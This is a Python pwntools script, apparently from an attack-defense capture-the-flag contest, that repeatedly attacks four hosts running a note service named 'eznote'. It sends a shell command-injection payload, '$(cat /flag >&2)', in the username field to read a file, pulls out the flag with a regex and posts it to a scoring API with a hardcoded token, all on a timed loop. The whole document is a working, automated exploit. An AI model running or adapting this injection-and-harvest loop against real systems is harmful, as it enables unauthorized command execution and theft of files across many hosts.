#!/usr/bin/env python3
from pwn import *
import argparse
import re
import time
import requests

# Configuration
TARGETS = [
    "172.29.42.42",
    "172.29.42.43",
    "172.29.42.44",
    "172.29.42.45"
]

API_URL = "http://10.2.60.1/api/ct/web/awd_race/race/26c4e794b2f1612181e55422e8ddc718/flag/robot/"
API_TOKEN = "67b0d49867ee5e16595959bac3fd1520"

def parse_args():
    p = argparse.ArgumentParser(description="Batch attack eznote and submit flags")
    p.add_argument("--port", type=int, required=True, help="Remote port")
    p.add_argument("--flag-path", default="/flag", help="Flag file path")
    p.add_argument("--timeout", type=float, default=2.0, help="Read timeout in seconds")
    p.add_argument("--interval", type=float, default=600.0, help="Loop interval in seconds")
    return p.parse_args()

def submit_flag_to_api(flag):
    """Submits the flag to the API."""
    print(f"[*] Submitting flag: {flag}")
    headers = {"Content-Type": "application/json"}
    data = {
        "flag": flag,
        "token": API_TOKEN
    }
    
    try:
        r = requests.post(API_URL, json=data, headers=headers, timeout=5)
        print(f"[+] API Response: {r.status_code} - {r.text}")
    except Exception as e:
        print(f"[-] API Submission failed: {e}")

def attack_host(host, port, args):
    """Attacks a single host and returns the flag if found."""
    print(f"\n[*] Attacking {host}:{port}...")
    
    try:
        io = remote(host, port, timeout=5)
        io.timeout = min(args.timeout, 0.2)
    except Exception as e:
        print(f"[-] Connection failed to {host}: {e}")
        return None

    try:
        io.recvuntil(b"Username:")
        payload = f"$(cat {args.flag_path} >&2)".encode()
        io.sendline(payload)

        io.recvuntil(b"> ")
        io.sendline(b"2")

        buf = b""
        deadline = time.time() + args.timeout
        while time.time() < deadline:
            try:
                chunk = io.recv()
                if chunk:
                    buf += chunk
            except EOFError:
                break
            except Exception:
                pass
        
        io.close()

        if not buf:
            print(f"[-] No output captured from {host}")
            return None

        m = re.search(rb"flag\{.*?\}", buf)
        if m:
            flag = m.group(0).decode(errors="replace")
            print(f"[+] Found flag on {host}: {flag}")
            return flag
        else:
            print(f"[-] No flag pattern found in output from {host}")
            # print(f"Output was: {buf.decode(errors='replace')}") # Debug
            return None

    except Exception as e:
        print(f"[-] Error during exploitation of {host}: {e}")
        try:
            io.close()
        except:
            pass
        return None

def run_once(args):
    for host in TARGETS:
        flag = attack_host(host, args.port, args)
        if flag:
            submit_flag_to_api(flag)

def main():
    args = parse_args()

    while True:
        started = time.time()
        run_once(args)
        elapsed = time.time() - started
        sleep_for = max(0.0, args.interval - elapsed)
        if sleep_for > 0:
            print(f"[*] Sleeping {sleep_for:.1f}s before next round")
            time.sleep(sleep_for)

if __name__ == "__main__":
    main()
